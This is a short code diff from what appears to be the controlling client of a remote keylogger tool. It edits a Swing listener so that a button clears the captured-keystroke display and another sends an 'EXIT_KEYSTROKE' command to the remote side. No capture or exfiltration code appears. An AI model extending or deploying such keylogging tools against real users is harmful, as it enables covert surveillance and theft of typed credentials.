@@ -7,7 +7,7 @@ import java.io.IOException;
 import javax.swing.JOptionPane;
 import javax.swing.JTextArea;
 
-import program.Client;
+import Program.Client;
 import view.ClientDesign;
 import view.KeylogDesign;
 
@@ -87,15 +87,22 @@ public class KeylogListener implements ActionListener{
 		}
 		else if ("CLEAR TEXT".equals(scr))
 		{
-//			try {
-//				Program.out.write(scr);
-//				Program.out.flush();
-//				
-				this.keylogDesign.text.setText("");
-//			} catch (IOException e1) {
-//				// TODO Auto-generated catch block
-//				e1.printStackTrace();
-//			}
+//			
+			this.keylogDesign.text.setText("");
+//			
+		}
+		else if ("Back to Menu".equals(scr))
+		{
+			try {
+				Client.out.write("EXIT_KEYSTROKE");
+				Client.out.newLine();
+				Client.out.flush();
+			} catch (IOException e2) {
+				// TODO Auto-generated catch block
+				e2.printStackTrace();
+			}
+			this.keylogDesign.setVisible(false);
+			
 		}
 	}
 	
